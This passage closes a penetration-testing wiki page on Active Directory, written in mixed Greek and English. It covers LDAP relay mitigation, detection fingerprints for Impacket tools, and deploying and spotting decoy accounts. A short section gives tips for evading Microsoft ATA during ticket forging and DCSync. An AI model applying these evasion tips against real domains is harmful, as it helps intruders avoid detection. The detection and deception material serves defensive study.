- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 και μετά enforced LDAP signing plus LDAPS channel binding on DCs/clients για να μπλοκαριστούν LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Αν θέλεις να εντοπίσεις κοινό AD tradecraft, **μην βασίζεσαι μόνο σε operator-controlled artifacts** όπως renamed binaries, service names, temp batch files, ή output paths. Κάνε baseline το πώς legitimate Windows clients δημιουργούν [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, και WMI traffic, και μετά αναζήτησε **implementation quirks** που παραμένουν ακόμα και αφού ο operator επεξεργαστεί τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ή `ntlmrelayx.py`.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Η υλοποίηση deception περιλαμβάνει τη δημιουργία traps, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή που είναι marked as Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία users με συγκεκριμένα rights ή την προσθήκη τους σε high privilege groups.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για το deploying deception techniques μπορείς να βρεις στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators περιλαμβάνουν atypical ObjectSID, infrequent logons, creation dates, και low bad password counts.
- **General Indicators**: Η σύγκριση των attributes των πιθανών decoy objects με εκείνα των genuine ones μπορεί να αποκαλύψει inconsistencies. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να αποτραπεί το ATA detection.
- **Ticket Impersonation**: Η χρήση **aes** keys για ticket creation βοηθά να αποφευχθεί η detection, επειδή δεν γίνεται downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από non-Domain Controller για να αποφευχθεί το ATA detection, καθώς η άμεση εκτέλεση από Domain Controller θα προκαλέσει alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
